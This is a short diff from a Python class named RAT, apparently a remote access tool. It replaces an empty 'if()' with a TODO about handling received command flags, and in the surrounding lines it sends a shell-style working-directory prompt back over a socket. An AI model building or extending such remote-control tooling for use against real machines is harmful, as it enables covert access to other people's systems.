@@ -192,8 +192,12 @@ class RAT:
 				if(data == cls.SIG):
 					cls.FLAG = True
 					cls.send("\n" + os.getcwd() + "> ")
-
-				if()
+				
+				## TODO ##
+				"""
+					Add received command flags conditions handler
+				"""
+				#if()
 
 			except socket.error as e:
 				# Connection refused
